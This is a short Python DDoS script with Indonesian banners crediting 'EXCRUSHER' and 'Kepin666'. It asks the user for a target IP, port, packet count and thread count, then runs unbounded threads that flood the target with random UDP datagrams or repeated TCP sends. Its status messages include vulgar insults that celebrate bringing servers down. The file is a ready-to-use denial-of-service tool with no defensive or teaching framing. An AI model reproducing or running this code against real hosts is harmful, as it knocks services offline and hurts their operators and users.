#!/usr/bin/env python3
#Semoga Tembus Ya Dek
#Ddos by EXCRUSHER
#Join My T3Am : https://discord.gg/Du6kz6NCeX
import random
import socket
import threading
import os

os.system("clear")
print("DDoSaTtack by Kepin666")
print("Kalau Mau Pakek Ganteng Dulu")
print("Mau rename? Pm Saya ")
ip = str(input(" DdosAttackByKepin | Ip:"))
port = int(input(" DdosAttackByKepin | Port:"))
choice = str(input(" DdosAttackByKepin | Gas Gak Ni?(y/n):"))
times = int(input(" DdosAttackByKepin | Packets:"))
threads = int(input(" DdosAttackByKepin | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | KEPIN666 |")
		except:
			print("[!] | Server down kontol!!! |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" KEPIN666 nih bos!!!")
		except:
			s.close()
			print("[*] Down lagi kontol")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
